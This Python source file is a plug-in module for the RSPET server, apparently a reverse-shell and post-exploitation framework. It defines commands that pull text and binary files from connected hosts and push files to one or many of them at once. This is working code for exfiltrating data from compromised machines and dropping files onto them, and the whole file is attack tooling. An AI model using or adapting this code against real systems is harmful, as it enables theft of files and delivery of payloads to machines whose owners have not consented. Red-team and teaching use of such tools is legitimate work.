"""
Plug-in module for RSPET server. Offer remote file inclusion functions.
"""
from socket import error as sock_error
from rspet.server.mount import command, installer


@command("connected")
def pull_file(server, args):
    """Pull a regular text file from the host.

    Help: <remote_file> [local_file]"""
    ret = [None, 0, ""]
    host = server.get_selected()[0]
    if len(args) == 0:
        ret[2] = ("Syntax : %s" % server.commands["Pull_File"].__syntax__)
        ret[1] = 1  # Invalid Syntax Error Code
    else:
        remote_file = args[0]
        try:
            local_file = args[1]
        except IndexError:
            local_file = remote_file
        try:
            host.send(host.command_dict['sendFile'])
            host.send(remote_file)
            if host.recv() == "fna":
                ret[2] += "File does not exist or Access Denied"
                ret[1] = 4  # Remote Access Denied Error Code
            else:
                try:
                    with open(local_file, "w") as file_obj:
                        file_obj.write(host.recv())
                except IOError:
                    ret[2] += "Cannot create local file"
                    ret[1] = 3  # Local Access Denied Error Code
        except sock_error:
            host.purge()
            ret[0] = "basic"
            ret[1] = 2  # Socket Error Code
    return ret


@command("connected")
def pull_binary(server, args):
    """Pull a binary file from the host.

    Help: <remote_bin> [local_bin]"""
    ret = [None, 0, ""]
    host = server.get_selected()[0]
    if len(args) == 0:
        ret[2] = ("Syntax : %s" % server.commands["Pull_Binary"].__syntax__)
        ret[1] = 1  # Invalid Syntax Error Code
    else:
        remote_file = args[0]
        try:
            local_file = args[1]
        except IndexError:
            local_file = remote_file
        try:
            host.send(host.command_dict['sendBinary'])
            host.send(remote_file)
            if host.recv() == "fna":
                ret[2] += "File does not exist or Access Denied"
                ret[1] = 4  # Remote Access Denied Error Code
            else:
                try:
                    with open(local_file, "wb") as file_obj:
                        file_obj.write(host.recv())
                except IOError:
                    ret[2] += "Cannot create local file"
                    ret[1] = 3  # Local Access Denied Error Code
        except sock_error:
            host.purge()
            ret[0] = "basic"
            ret[1] = 2  # Socket Error Code
    return ret


@command("connected", "multiple")
def make_file(server, args):
    """Send a regular text file to the host(s).

    Help: <local_file> [remote_file]"""
    ret = [None, 0, ""]
    hosts = server.get_selected()
    if len(args) == 0:
        ret[2] = ("Syntax : %s" % server.commands["make_file"].__syntax__)
        ret[1] = 1  # Invalid Syntax Error Code
    else:
        local_file = args[0]
        try:
            remote_file = args[1]
        except IndexError:
            remote_file = local_file.split("/")[-1]
        for host in hosts:
            try:
                host.send(host.command_dict['getFile'])
                host.send(remote_file)
                if host.recv() == "fna":
                    ret[2] += "Access Denied"
                    ret[1] = 4  # Remote Access Denied Error Code
                else:
                    with open(local_file) as file_obj:
                        contents = file_obj.read()
                        host.send(contents)
                        host.recv()  # For future use?
            except sock_error:
                host.purge()
                ret[0] = "basic"
                ret[1] = 2  # Socket Error Code
            except IOError:
                ret[1] = 3  # LocalAccessError Code
                ret[2] += "File not found!"
    return ret


@command("connected", "multiple")
def make_binary(server, args):
    """Send a binary file to the host(s).

    Help: <local_bin> [remote_bin]"""
    ret = [None, 0, ""]
    hosts = server.get_selected()
    if len(args) == 0:
        ret[2] = ("Syntax : %s" % server.commands["make_binary"].__syntax__)
        ret[1] = 1  # Invalid Syntax Error Code
    else:
        local_file = args[0]
        try:
            remote_file = args[1]
        except IndexError:
            remote_file = local_file.split("/")[-1]
        for host in hosts:
            try:
                host.send(host.command_dict['getBinary'])
                host.send(remote_file)
                if host.recv() == "fna":
                    ret[2] += "Access Denied"
                    ret[1] = 4  # Remote Access Denied Error Code
                else:
                    with open(local_file, "rb") as file_obj:
                        contents = file_obj.read()
                        host.send(contents)
                        host.recv()  # For future use?
            except sock_error:
                host.purge()
                ret[0] = "basic"
                ret[1] = 2  # Socket Error Code
            except IOError:
                ret[1] = 3  # LocalAccessError Code
                ret[2] += "File not found!"
    return ret


@installer(__name__)
def setup(app, commands):
    pass
